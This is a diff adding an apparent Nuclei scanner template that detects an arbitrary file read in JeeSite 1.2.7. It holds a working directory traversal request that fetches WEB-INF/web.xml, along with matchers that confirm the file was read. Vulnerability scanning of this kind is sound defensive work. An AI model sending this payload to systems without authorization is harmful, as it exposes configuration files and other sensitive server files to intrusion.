@@ -1,0 +1,29 @@
+id: jeesite-file-read
+
+info:
+  name: JEESITE V1.2.7 Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    JeeSite 1.x versions have an arbitrary file read vulnerability in the UserfilesDownloadServlet function due to improper handling of URLs, allowing attackers to access sensitive files.
+  tags: directory-traversal, file-read
+  reference:
+    - http://www.yulegeyu.com/2021/06/19/JEESITE-V1-2-7-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/
+    - https://jeesite.com
+
+http:
+  - raw:
+      - |
+        GET /userfiles;/userfiles/../WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<display-name>"
+          - "<listener-class>"
+        part: body
+      - type: status
+        status:
+          - 200
